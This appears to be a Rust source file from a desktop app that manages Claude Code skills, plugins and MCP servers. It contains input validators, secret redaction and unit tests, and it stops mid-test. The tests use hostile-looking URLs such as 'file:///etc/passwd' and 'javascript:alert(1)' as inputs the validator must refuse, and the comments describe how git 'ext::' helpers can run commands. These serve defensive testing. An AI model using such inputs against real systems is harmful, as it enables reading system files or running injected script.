use std::path::PathBuf;
use std::sync::Arc;

use fettlr_core::{
    ClaudeCli, CliRunner, CoreError, Fettlr, McpOrigin, McpServer, ParkedSkill, ParkedSubagent,
    Paths, ProcessCliRunner, Scope, Skill, Snapshot, Subagent,
};
use serde::{Deserialize, Serialize};
use specta::Type;
use tauri::{AppHandle, State};
use tauri_plugin_autostart::ManagerExt;
use tauri_specta::Event;

use crate::dto::{
    UiError, UiMcpInput, UiPrefs, UiScope, UiSecretField, UiSnapshot, redact, reveal_field,
    secret_values,
};
use crate::prefs::Prefs;
use crate::state::AppState;

/// A value that reaches an argv slot must not be readable as a flag by `claude` or by `git`.
fn checked_operand(value: &str, what: &str) -> Answer<()> {
    if value.is_empty() || value.starts_with('-') || value.chars().any(char::is_control) {
        return Err(UiError::message(format!(
            "Fettlr did not act on {what} because {value:?} is not a name it can pass safely."
        )));
    }
    Ok(())
}

/// A marketplace source is the one string the reader types that Fettlr hands to `claude` to clone,
/// and whose remote Fettlr then re-fetches unattended. `transport::address` selects a git remote
/// helper, and `ext::` runs an arbitrary command, so only the shapes a marketplace really takes are
/// allowed through.
fn checked_marketplace_source(source: &str) -> Answer<()> {
    if is_safe_marketplace_source(source) {
        return Ok(());
    }
    Err(UiError::message(format!(
        "Fettlr did not add {source:?}. Give a marketplace as owner/repo, an https URL, an SSH remote, or a folder on this Mac."
    )))
}

fn is_safe_marketplace_source(source: &str) -> bool {
    if source.is_empty()
        || source.starts_with('-')
        || source.chars().any(|c| c.is_control() || c.is_whitespace())
    {
        return false;
    }
    if source.contains("::") {
        return false;
    }
    if let Some((scheme, rest)) = source.split_once("://") {
        return scheme.eq_ignore_ascii_case("https") && !rest.is_empty();
    }
    if source.starts_with("git@") || source.starts_with('/') || source.starts_with('.') {
        return true;
    }
    let mut parts = source.split('/');
    match (parts.next(), parts.next(), parts.next()) {
        (Some(owner), Some(repo), None) => is_repo_word(owner) && is_repo_word(repo),
        _ => false,
    }
}

fn is_repo_word(word: &str) -> bool {
    !word.is_empty()
        && word
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
}

#[derive(Clone, Debug, Serialize, Deserialize, Type, Event)]
pub struct StateChanged(pub UiSnapshot);

#[derive(Clone, Debug, Serialize, Deserialize, Type, Event)]
#[serde(rename_all = "camelCase")]
pub struct UpdateProgress {
    pub name: String,
    pub done: u32,
    pub total: u32,
}

type Answer<T> = Result<T, UiError>;

/// Every core call reaches the filesystem or shells out to `claude`, so none of them may run on the
/// async runtime's own threads.
async fn blocking<T, F>(work: F) -> Answer<T>
where
    F: FnOnce() -> Answer<T> + Send + 'static,
    T: Send + 'static,
{
    match tauri::async_runtime::spawn_blocking(work).await {
        Ok(answer) => answer,
        Err(error) => Err(UiError::message(format!(
            "Fettlr could not finish that: {error}"
        ))),
    }
}

fn snapshot_of(result: Result<Snapshot, CoreError>) -> Answer<UiSnapshot> {
    result.map(UiSnapshot::from).map_err(UiError::from)
}

/// A mutation refreshes the core whether it succeeded or not, so a failure leaves the window
/// holding the only stale copy of the world. It resolves every id it sends back against the core's
/// copy, so a row it still shows is a row it can no longer act on. Publishing here is what the
/// watcher would eventually do anyway, without the wait.
fn published(
    state: &Arc<AppState>,
    fettlr: &Fettlr,
    answer: Answer<UiSnapshot>,
) -> Answer<UiSnapshot> {
    if answer.is_err()
        && let Some(app) = state.app()
        && let Err(error) = StateChanged(UiSnapshot::from(fettlr.snapshot())).emit(app)
    {
        log::warn!("could not publish the state a failed command left behind: {error}");
    }
    answer
}

/// A rejected `claude mcp add-json` echoes the config it was handed, so every answer built from one
/// has to be scrubbed before it reaches the window, the same way `mcp_details` scrubs the config the
/// CLI prints back.
fn scrubbed<T>(answer: Answer<T>, secrets: &[String]) -> Answer<T> {
    answer.map_err(|error| UiError {
        message: redact(error.message, secrets),
        detail: error.detail.map(|detail| redact(detail, secrets)),
    })
}

fn find_skill(fettlr: &Fettlr, id: &str) -> Answer<Skill> {
    fettlr
        .snapshot()
        .skills
        .into_iter()
        .find(|skill| skill.id == id)
        .ok_or_else(|| UiError::message(format!("Fettlr no longer knows a skill called {id}.")))
}

fn find_parked_skill(fettlr: &Fettlr, id: &str) -> Answer<ParkedSkill> {
    fettlr
        .snapshot()
        .parked_skills
        .into_iter()
        .find(|parked| parked.parked_path == id)
        .ok_or_else(|| UiError::message(format!("Fettlr no longer knows a parked skill at {id}.")))
}

fn find_subagent(fettlr: &Fettlr, id: &str) -> Answer<Subagent> {
    fettlr
        .snapshot()
        .subagents
        .into_iter()
        .find(|subagent| subagent.id == id)
        .ok_or_else(|| UiError::message(format!("Fettlr no longer knows a subagent called {id}.")))
}

fn find_parked_subagent(fettlr: &Fettlr, id: &str) -> Answer<ParkedSubagent> {
    fettlr
        .snapshot()
        .parked_subagents
        .into_iter()
        .find(|parked| parked.parked_path == id)
        .ok_or_else(|| {
            UiError::message(format!("Fettlr no longer knows a parked subagent at {id}."))
        })
}

/// Every server carrying this name, whatever its origin, not just the one the CLI resolved: a
/// same-named server in another scope costs nothing to include and closes the gap where the CLI
/// prints a scope Fettlr assembled differently. A plugin's server is asked for as
/// `plugin:<plugin name>:<server>`, so that form matches too.
fn mcp_secrets(snapshot: &Snapshot, name: &str) -> Vec<String> {
    secret_values(
        snapshot
            .mcp_servers
            .iter()
            .filter(|server| {
                server.name == name || plugin_server_name(server).as_deref() == Some(name)
            })
            .map(|server| &server.config),
    )
}

fn plugin_server_name(server: &McpServer) -> Option<String> {
    let McpOrigin::Plugin { plugin_id } = &server.origin else {
        return None;
    };
    let plugin_name = plugin_id
        .rsplit_once('@')
        .map_or(plugin_id.as_str(), |(name, _)| name);
    Some(format!("plugin:{plugin_name}:{}", server.name))
}

fn plugin_secrets(snapshot: &Snapshot, plugin_id: &str) -> Vec<String> {
    secret_values(
        snapshot
            .plugins
            .iter()
            .chain(snapshot.available_plugins.iter())
            .filter(|plugin| plugin.plugin_id == plugin_id)
            .filter_map(|plugin| plugin.mcp_servers.as_ref())
            .flat_map(|servers| servers.values()),
    )
}

fn find_mcp_server(fettlr: &Fettlr, id: &str) -> Answer<McpServer> {
    fettlr
        .snapshot()
        .mcp_servers
        .into_iter()
        .find(|server| server.id == id)
        .ok_or_else(|| {
            UiError::message(format!("Fettlr no longer knows an MCP server called {id}."))
        })
}

#[tauri::command]
#[specta::specta]
pub async fn refresh(state: State<'_, Arc<AppState>>) -> Answer<UiSnapshot> {
    let fettlr = state.fettlr();
    blocking(move || snapshot_of(fettlr.refresh())).await
}

#[tauri::command]
#[specta::specta]
pub async fn check_updates(state: State<'_, Arc<AppState>>) -> Answer<UiSnapshot> {
    let fettlr = state.fettlr();
    blocking(move || snapshot_of(fettlr.check_updates())).await
}

type Mutated = Answer<(Result<Snapshot, CoreError>, Vec<String>)>;

/// Runs one core mutation off the async runtime. `work` returns the core's result with the secrets
/// to scrub from any failure; an early `Err` from it (an id that no longer resolves, an operand
/// that failed its check) is returned as is.
async fn mutation(
    state: &State<'_, Arc<AppState>>,
    work: impl FnOnce(&Fettlr) -> Mutated + Send + 'static,
) -> Answer<UiSnapshot> {
    let fettlr = state.fettlr();
    let state = Arc::clone(state.inner());
    blocking(move || {
        let (result, secrets) = work(&fettlr)?;
        published(&state, &fettlr, scrubbed(snapshot_of(result), &secrets))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn park_skill(state: State<'_, Arc<AppState>>, skill_id: String) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        let skill = find_skill(fettlr, &skill_id)?;
        Ok((fettlr.park_skill(&skill), Vec::new()))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn restore_skill(
    state: State<'_, Arc<AppState>>,
    parked_id: String,
) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        let parked = find_parked_skill(fettlr, &parked_id)?;
        Ok((fettlr.restore_skill(&parked), Vec::new()))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn delete_skill(state: State<'_, Arc<AppState>>, skill_id: String) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        let skill = find_skill(fettlr, &skill_id)?;
        Ok((fettlr.delete_skill(&skill), Vec::new()))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn delete_parked_skill(
    state: State<'_, Arc<AppState>>,
    parked_id: String,
) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        let parked = find_parked_skill(fettlr, &parked_id)?;
        Ok((fettlr.delete_parked_skill(&parked), Vec::new()))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn park_subagent(
    state: State<'_, Arc<AppState>>,
    subagent_id: String,
) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        let subagent = find_subagent(fettlr, &subagent_id)?;
        Ok((fettlr.park_subagent(&subagent), Vec::new()))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn restore_subagent(
    state: State<'_, Arc<AppState>>,
    parked_id: String,
) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        let parked = find_parked_subagent(fettlr, &parked_id)?;
        Ok((fettlr.restore_subagent(&parked), Vec::new()))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn delete_subagent(
    state: State<'_, Arc<AppState>>,
    subagent_id: String,
) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        let subagent = find_subagent(fettlr, &subagent_id)?;
        Ok((fettlr.delete_subagent(&subagent), Vec::new()))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn delete_parked_subagent(
    state: State<'_, Arc<AppState>>,
    parked_id: String,
) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        let parked = find_parked_subagent(fettlr, &parked_id)?;
        Ok((fettlr.delete_parked_subagent(&parked), Vec::new()))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn pull_skill(state: State<'_, Arc<AppState>>, skill_id: String) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        let skill = find_skill(fettlr, &skill_id)?;
        Ok((fettlr.pull_skill(&skill), Vec::new()))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn install_plugin(
    state: State<'_, Arc<AppState>>,
    plugin_id: String,
    scope: UiScope,
) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        checked_operand(&plugin_id, "that plugin")?;
        let secrets = plugin_secrets(&fettlr.snapshot(), &plugin_id);
        Ok((
            fettlr.install_plugin(&plugin_id, &Scope::from(&scope)),
            secrets,
        ))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn uninstall_plugin(
    state: State<'_, Arc<AppState>>,
    plugin_id: String,
    scope: UiScope,
) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        checked_operand(&plugin_id, "that plugin")?;
        let secrets = plugin_secrets(&fettlr.snapshot(), &plugin_id);
        Ok((
            fettlr.uninstall_plugin(&plugin_id, &Scope::from(&scope)),
            secrets,
        ))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn set_plugin_enabled(
    state: State<'_, Arc<AppState>>,
    plugin_id: String,
    enabled: bool,
    scope: UiScope,
) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        checked_operand(&plugin_id, "that plugin")?;
        let secrets = plugin_secrets(&fettlr.snapshot(), &plugin_id);
        Ok((
            fettlr.set_plugin_enabled(&plugin_id, enabled, &Scope::from(&scope)),
            secrets,
        ))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn update_plugin(
    state: State<'_, Arc<AppState>>,
    plugin_id: String,
    scope: UiScope,
) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        checked_operand(&plugin_id, "that plugin")?;
        let secrets = plugin_secrets(&fettlr.snapshot(), &plugin_id);
        Ok((
            fettlr.update_plugin(&plugin_id, &Scope::from(&scope)),
            secrets,
        ))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn add_marketplace(
    state: State<'_, Arc<AppState>>,
    source: String,
) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        checked_marketplace_source(&source)?;
        Ok((fettlr.add_marketplace(&source), Vec::new()))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn remove_marketplace(
    state: State<'_, Arc<AppState>>,
    name: String,
) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        checked_operand(&name, "that marketplace")?;
        Ok((fettlr.remove_marketplace(&name), Vec::new()))
    })
    .await
}

/// `name: None` updates every marketplace in one call.
#[tauri::command]
#[specta::specta]
pub async fn update_marketplace(
    state: State<'_, Arc<AppState>>,
    name: Option<String>,
) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        if let Some(name) = name.as_deref() {
            checked_operand(name, "that marketplace")?;
        }
        Ok((fettlr.update_marketplace(name.as_deref()), Vec::new()))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn add_mcp_server(
    state: State<'_, Arc<AppState>>,
    input: UiMcpInput,
) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        checked_operand(&input.name, "that MCP server")?;
        let config = input.config.to_config()?;
        let secrets = secret_values(std::iter::once(&config));
        Ok((
            fettlr.add_mcp_server(&input.name, &config, &(&input.origin).into()),
            secrets,
        ))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn edit_mcp_server(
    state: State<'_, Arc<AppState>>,
    server_id: String,
    input: UiMcpInput,
) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        let server = find_mcp_server(fettlr, &server_id)?;
        checked_operand(&server.name, "that MCP server")?;
        checked_operand(&input.name, "that MCP server")?;
        let mut config = input.config.to_config()?;
        // The form round-trips only the six fields it can show. Anything else Claude Code wrote
        // has to come from the server being edited, or editing one would be how it is lost.
        config.extra = server.config.extra.clone();
        let secrets = secret_values([&config, &server.config].into_iter());
        Ok((
            fettlr.edit_mcp_server(&server, &input.name, &config),
            secrets,
        ))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn remove_mcp_server(
    state: State<'_, Arc<AppState>>,
    server_id: String,
) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        let server = find_mcp_server(fettlr, &server_id)?;
        checked_operand(&server.name, "that MCP server")?;
        let secrets = secret_values(std::iter::once(&server.config));
        Ok((fettlr.remove_mcp_server(&server), secrets))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn promote_mcp_server(
    state: State<'_, Arc<AppState>>,
    server_id: String,
) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        let server = find_mcp_server(fettlr, &server_id)?;
        checked_operand(&server.name, "that MCP server")?;
        let secrets = secret_values(std::iter::once(&server.config));
        Ok((fettlr.promote_mcp_server(&server), secrets))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn set_mcp_server_enabled(
    state: State<'_, Arc<AppState>>,
    server_id: String,
    enabled: bool,
) -> Answer<UiSnapshot> {
    mutation(&state, move |fettlr| {
        let server = find_mcp_server(fettlr, &server_id)?;
        checked_operand(&server.name, "that MCP server")?;
        let secrets = secret_values(std::iter::once(&server.config));
        Ok((fettlr.set_mcp_server_enabled(&server, enabled), secrets))
    })
    .await
}

/// The only way a real environment variable, header, argument or URL value leaves the shell: one
/// field at a time, and only when the reader asks for it. `expected` is the masked text the window
/// is showing for an argument or the URL, so a reveal never lands on a different one after a
/// refresh moved things.
#[tauri::command]
#[specta::specta]
pub async fn reveal_secret(
    state: State<'_, Arc<AppState>>,
    server_id: String,
    field: UiSecretField,
    key: String,
    expected: Option<String>,
) -> Answer<String> {
    let fettlr = state.fettlr();
    blocking(move || {
        let server = find_mcp_server(&fettlr, &server_id)?;
        reveal_field(
            &server.name,
            &server.config,
            field,
            &key,
            expected.as_deref(),
        )
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn update_all(app: AppHandle, state: State<'_, Arc<AppState>>) -> Answer<UiSnapshot> {
    let fettlr = state.fettlr();
    blocking(move || {
        let report = |progress: fettlr_core::UpdateProgress| {
            let event = UpdateProgress {
                name: progress.name,
                done: progress.completed as u32,
                total: progress.total as u32,
            };
            if let Err(error) = event.emit(&app) {
                log::warn!("could not report update progress: {error}");
            }
        };
        snapshot_of(fettlr.update_all(&report))
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn plugin_details(state: State<'_, Arc<AppState>>, plugin_id: String) -> Answer<String> {
    let fettlr = state.fettlr();
    blocking(move || {
        checked_operand(&plugin_id, "that plugin")?;
        let secrets = plugin_secrets(&fettlr.snapshot(), &plugin_id);
        scrubbed(
            fettlr
                .plugin_details(&plugin_id)
                .map(|output| redact(output, &secrets))
                .map_err(UiError::from),
            &secrets,
        )
    })
    .await
}

/// Deliberately its own command rather than part of a refresh: `claude mcp list` health checks
/// every server on the machine, which means network calls and spawning every stdio server, so it
/// runs only when a reader asks for it.
#[tauri::command]
#[specta::specta]
pub async fn refresh_connectors(state: State<'_, Arc<AppState>>) -> Answer<UiSnapshot> {
    let fettlr = state.fettlr();
    let state = Arc::clone(state.inner());
    blocking(move || published(&state, &fettlr, snapshot_of(fettlr.refresh_connectors()))).await
}

#[tauri::command]
#[specta::specta]
pub async fn mcp_details(
    state: State<'_, Arc<AppState>>,
    name: String,
    project: Option<String>,
) -> Answer<String> {
    let fettlr = state.fettlr();
    blocking(move || {
        checked_operand(&name, "that MCP server")?;
        let secrets = mcp_secrets(&fettlr.snapshot(), &name);
        scrubbed(
            fettlr
                .mcp_get(&name, project.as_deref())
                .map(|output| redact(output, &secrets))
                .map_err(UiError::from),
            &secrets,
        )
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn reveal_in_finder(path: String) -> Answer<()> {
    blocking(move || {
        tauri_plugin_opener::reveal_item_in_dir(&path).map_err(|error| UiError {
            message: format!("Could not show {path} in the Finder."),
            detail: Some(error.to_string()),
        })
    })
    .await
}

#[tauri::command]
#[specta::specta]
pub async fn open_path(path: String) -> Answer<()> {
    blocking(move || {
        let resolved = checked_markdown(&path)?;
        tauri_plugin_opener::open_path(&resolved, None::<&str>).map_err(|error| UiError {
            message: format!("Could not open {path}."),
            detail: Some(error.to_string()),
        })
    })
    .await
}

/// The window only ever opens Markdown: a skill's `SKILL.md` or a subagent's own file. Handing the
/// operating system's opener anything else would run an app bundle or a `.command` on the reader's
/// behalf, which is the one thing the opener capability withholds from the window and which a
/// Rust-side call would restore.
fn checked_markdown(path: &str) -> Answer<PathBuf> {
    let refuse = || UiError::message(format!("Fettlr only opens Markdown files, not {path}."));
    let resolved = std::fs::canonicalize(path).map_err(|_| refuse())?;
    let is_markdown = resolved
        .extension()
        .and_then(|extension| extension.to_str())
        .is_some_and(|extension| extension.eq_ignore_ascii_case("md"));
    if !is_markdown || !std::fs::metadata(&resolved).is_ok_and(|metadata| metadata.is_file()) {
        return Err(refuse());
    }
    Ok(resolved)
}

/// Web links only. The window never asks for anything else, and handing an arbitrary scheme to the
/// operating system's opener would let one reach a local handler on the reader's behalf.
#[tauri::command]
#[specta::specta]
pub async fn open_url(url: String) -> Answer<()> {
    blocking(move || {
        let url = url.trim().to_string();
        if !is_web_url(&url) {
            return Err(UiError::message(format!(
                "Fettlr only opens web links, so it did not open {url}."
            )));
        }
        tauri_plugin_opener::open_url(&url, None::<&str>).map_err(|error| UiError {
            message: format!("Could not open {url}."),
            detail: Some(error.to_string()),
        })
    })
    .await
}

fn is_web_url(url: &str) -> bool {
    let lowered = url.to_ascii_lowercase();
    lowered.starts_with("http://") || lowered.starts_with("https://")
}

#[tauri::command]
#[specta::specta]
pub async fn app_version(app: AppHandle) -> Answer<String> {
    Ok(app.package_info().version.to_string())
}

/// The binary the reader's typed path would actually produce, resolved through the same rungs the
/// core walks. A path that is typed but not usable answers `None` rather than the rung below it,
/// because a tick against a path Fettlr is quietly ignoring is worse than no tick at all.
#[tauri::command]
#[specta::specta]
pub async fn probe_binary(
    state: State<'_, Arc<AppState>>,
    path: Option<String>,
) -> Answer<Option<String>> {
    let paths = state.paths_probing(override_path(path.as_deref()));
    blocking(move || {
        Ok(resolve_binary(Arc::new(ProcessCliRunner), &paths)
            .map(|found| found.display().to_string()))
    })
    .await
}

fn override_path(path: Option<&str>) -> Option<PathBuf> {
    path.map(str::trim)
        .filter(|value| !value.is_empty())
        .map(PathBuf::from)
}

fn resolve_binary(runner: Arc<dyn CliRunner>, paths: &Paths) -> Option<PathBuf> {
    let requested = paths.binary_override.clone();
    let resolved = ClaudeCli::new(runner, paths).binary().ok()?;
    match requested {
        Some(over) if over != resolved => None,
        _ => Some(resolved),
    }
}

/// The login item lives in the operating system, so the stored flag is only a fallback: a reader
/// who removes Fettlr from their login items elsewhere must not come back to a switch still
/// showing "on".
#[tauri::command]
#[specta::specta]
pub async fn get_prefs(app: AppHandle, state: State<'_, Arc<AppState>>) -> Answer<UiPrefs> {
    let mut prefs = UiPrefs::from(&state.prefs());
    match app.autolaunch().is_enabled() {
        Ok(enabled) => prefs.launch_at_login = enabled,
        Err(error) => log::warn!("could not read the login item: {error}"),
    }
    Ok(prefs)
}

/// A changed binary override rebuilds the core handle, whose cache starts empty. The refilled
/// snapshot goes out as `state-changed` rather than as this command's answer, so the window is
/// back in step through the channel it already listens on and the settings screen has nothing
/// extra to do.
#[tauri::command]
#[specta::specta]
pub async fn set_prefs(
    app: AppHandle,
    state: State<'_, Arc<AppState>>,
    prefs: UiPrefs,
) -> Answer<UiPrefs> {
    let state = Arc::clone(&state);
    blocking(move || {
        set_launch_at_login(&app, prefs.launch_at_login)?;
        let outcome = state
            .set_prefs(Prefs::from(&prefs))
            .map_err(UiError::from)?;
        if let Some(snapshot) = outcome.refreshed
            && let Err(error) = StateChanged(UiSnapshot::from(snapshot)).emit(&app)
        {
            log::warn!("could not publish the state the new binary read: {error}");
        }
        Ok(UiPrefs::from(&outcome.prefs))
    })
    .await
}

/// Reported rather than swallowed: the switch has to move back if the login item did not.
fn set_launch_at_login(app: &AppHandle, wanted: bool) -> Answer<()> {
    let manager = app.autolaunch();
    if manager.is_enabled().unwrap_or(!wanted) == wanted {
        return Ok(());
    }
    let outcome = if wanted {
        manager.enable()
    } else {
        manager.disable()
    };
    outcome.map_err(|error| UiError {
        message: if wanted {
            "Fettlr could not add itself to your login items.".to_string()
        } else {
            "Fettlr could not remove itself from your login items.".to_string()
        },
        detail: Some(error.to_string()),
    })
}

#[cfg(test)]
mod tests {
    use std::path::PathBuf;

    use fettlr_core::testing::FakeCliRunner;
    use fettlr_core::{ClaudeCli, McpOrigin, McpServer, Paths, PluginRecord};

    use super::*;
    use crate::dto::MASK;

    const SECRET: &str = "sk-live-do-not-print-me";

    fn stub_binary(dir: &std::path::Path) -> PathBuf {
        use std::os::unix::fs::PermissionsExt;
        let binary = dir.join("claude");
        std::fs::write(&binary, "#!/bin/sh\n").expect("write stub");
        std::fs::set_permissions(&binary, std::fs::Permissions::from_mode(0o755))
            .expect("make the stub executable");
        binary
    }

    /// A real `ClaudeCli` over a fake runner, so the test drives the same call path the commands
    /// do and only the process boundary is replaced.
    fn cli_printing(stdout: &str) -> (ClaudeCli, tempfile::TempDir) {
        let dir = tempfile::TempDir::new().expect("tempdir");
        let paths = Paths {
            claude_dir: dir.path().join(".claude"),
            claude_json: dir.path().join(".claude.json"),
            support_dir: dir.path().join("Support"),
            binary_override: Some(stub_binary(dir.path())),
        };
        let runner = Arc::new(FakeCliRunner::with_stdout(stdout));
        (ClaudeCli::new(runner, &paths), dir)
    }

    fn config(json: serde_json::Value) -> fettlr_core::McpServerConfig {
        serde_json::from_value(json).expect("decode config")
    }

    /// A tree with nothing installed anywhere the core looks, so a probe answers only about the
    /// rungs the test puts there.
    fn empty_paths(dir: &std::path::Path, binary_override: Option<PathBuf>) -> Paths {
        Paths {
            claude_dir: dir.join(".claude"),
            claude_json: dir.join(".claude.json"),
            support_dir: dir.join("Support"),
            binary_override,
        }
    }

    fn silent_runner() -> Arc<dyn CliRunner> {
        Arc::new(FakeCliRunner::with_stdout(""))
    }

    #[test]
    fn a_probe_finds_a_binary_the_typed_path_points_at() {
        let dir = tempfile::TempDir::new().expect("tempdir");
        let binary = stub_binary(dir.path());

        let found = resolve_binary(
            silent_runner(),
            &empty_paths(dir.path(), Some(binary.clone())),
        );

        assert_eq!(found, Some(binary));
    }

    /// Answering with the rung below would show a tick beside a path Fettlr is ignoring.
    #[test]
    fn a_probe_refuses_a_typed_path_that_is_not_executable() {
        let dir = tempfile::TempDir::new().expect("tempdir");
        std::fs::create_dir_all(dir.path().join(".claude/local")).expect("create local dir");
        stub_binary(&dir.path().join(".claude/local"));
        let typed = dir.path().join("nowhere/claude");

        let found = resolve_binary(silent_runner(), &empty_paths(dir.path(), Some(typed)));

        assert_eq!(found, None);
    }

    /// A probe that only walked the well-known install locations would report "not found" for a
    /// machine the app is happily driving.
    #[test]
    fn an_empty_path_still_reaches_the_rungs_only_the_core_walks() {
        let dir = tempfile::TempDir::new().expect("tempdir");
        std::fs::create_dir_all(dir.path().join(".claude/local")).expect("create local dir");
        let binary = stub_binary(&dir.path().join(".claude/local"));

        let found = resolve_binary(silent_runner(), &empty_paths(dir.path(), None));

        assert_eq!(found, Some(binary));
    }

    #[test]
    fn only_http_and_https_links_are_opened() {
        assert!(is_web_url("https://fettlr.app"));
        assert!(is_web_url("http://localhost:1420"));
        assert!(is_web_url("HTTPS://fettlr.app"));
        assert!(!is_web_url("  https://fettlr.app"));
    }

    #[test]
    fn a_link_the_operating_system_would_hand_to_a_local_handler_is_refused() {
        for url in [
            "file:///etc/passwd",
            "javascript:alert(1)",
            "vscode://file/etc/passwd",
            "mailto:someone@example.com",
            "/Applications/Calculator.app",
            "httpx://fettlr.app",
            "",
        ] {
            assert!(!is_web_url(url), "{url} should not open");
        }
    }

    #[test]
    fn a_blank_typed_path_counts_as_no_override() {
        assert_eq!(override_path(Some("   ")), None);
        assert_eq!(override_path(None), None);
        assert_eq!(
            override_path(Some(" /opt/bin/claude ")),
            Some(PathBuf::from("/opt/bin/claude"))
        );
    }

    fn snapshot_with_server(server: McpServer) -> Snapshot {
        Snapshot {
            mcp_servers: vec![server],
            ..Snapshot::default()
        }
    }

    #[test]
    fn mcp_details_masks_an_env_value_the_cli_printed() {
        let server = McpServer::new(
            "context7",
            McpOrigin::UserScope,
            config(serde_json::json!({"command": "npx", "env": {"TOKEN": SECRET}})),
            true,
        );
        let snapshot = snapshot_with_server(server);
        let (cli, _dir) = cli_printing(&format!(
            "context7:\n  Type: stdio\n  Environment:\n    TOKEN={SECRET}\n"
        ));

        let output = redact(
            cli.mcp_get("context7", None).expect("runs"),
            &mcp_secrets(&snapshot, "context7"),
        );

        assert!(!output.contains(SECRET));
        assert!(output.contains(MASK));
        assert!(output.contains("TOKEN="));
    }

    #[test]
    fn mcp_details_masks_a_header_value_the_cli_printed() {
        let server = McpServer::new(
            "figma",
            McpOrigin::UserScope,
            config(serde_json::json!({
                "url": "https://example.com",
                "headers": {"Authorization": format!("Bearer {SECRET}")}
            })),
            true,
        );
        let snapshot = snapshot_with_server(server);
        let (cli, _dir) = cli_printing(&format!(
            "figma:\n  Headers:\n    Authorization: Bearer {SECRET}\n"
        ));

        let output = redact(
            cli.mcp_get("figma", None).expect("runs"),
            &mcp_secrets(&snapshot, "figma"),
        );

        assert!(!output.contains(SECRET));
        assert!(output.contains(MASK));
    }

    /// The redaction has to hold whatever shape the CLI prints, since Fettlr shows the block
    /// verbatim and the format is not Fettlr's to pin down.
    #[test]
    fn mcp_details_masks_a_value_wherever_it_lands_in_the_output() {
        let server = McpServer::new(
            "context7",
            McpOrigin::UserScope,
            config(serde_json::json!({"command": "npx", "env": {"TOKEN": SECRET}})),
            true,
        );
        let snapshot = snapshot_with_server(server);
        for layout in [
            format!("{{\"env\":{{\"TOKEN\":\"{SECRET}\"}}}}"),
            format!("TOKEN -> {SECRET}"),
            format!("running: npx --token {SECRET} --verbose"),
        ] {
            let (cli, _dir) = cli_printing(&layout);
            let output = redact(
                cli.mcp_get("context7", None).expect("runs"),
                &mcp_secrets(&snapshot, "context7"),
            );
            assert!(!output.contains(SECRET), "leaked from layout {layout}");
        }
    }

    #[test]
    fn mcp_details_leaves_an_output_without_secrets_alone() {
        let server = McpServer::new(
            "context7",
            McpOrigin::UserScope,
            config(serde_json::json!({"command": "npx"})),
            true,
        );
        let snapshot = snapshot_with_server(server);
        let printed = "context7:\n  Type: stdio\n  Command: npx\n  Environment:\n";
        let (cli, _dir) = cli_printing(printed);

        let output = redact(
            cli.mcp_get("context7", None).expect("runs"),
            &mcp_secrets(&snapshot, "context7"),
        );

        assert_eq!(output, printed);
    }

    #[test]
    fn plugin_details_masks_a_bundled_server_secret() {
        let plugin: PluginRecord = serde_json::from_value(serde_json::json!({
            "id": "helper@market",
            "installPath": "/tmp/helper",
            "mcpServers": {"inner": {"command": "npx", "env": {"TOKEN": SECRET}}}
        }))
        .expect("decode plugin");
        let snapshot = Snapshot {
            plugins: vec![plugin],
            ..Snapshot::default()
        };
        let (cli, _dir) = cli_printing(&format!("helper@market\n  MCP: inner (TOKEN={SECRET})\n"));

        let output = redact(
            cli.plugin_details("helper@market").expect("runs"),
            &plugin_secrets(&snapshot, "helper@market"),
        );

        assert!(!output.contains(SECRET));
        assert!(output.contains(MASK));
    }

    #[test]
    fn plugin_details_masks_a_catalogue_entrys_secret_too() {
        let plugin: PluginRecord = serde_json::from_value(serde_json::json!({
            "id": "helper@market",
            "mcpServers": {"inner": {"command": "npx", "env": {"TOKEN": SECRET}}}
        }))
        .expect("decode plugin");
        let snapshot = Snapshot {
            available_plugins: vec![plugin],
            ..Snapshot::default()
        };
        let (cli, _dir) = cli_printing(&format!("helper@market TOKEN={SECRET}"));

        let output = redact(
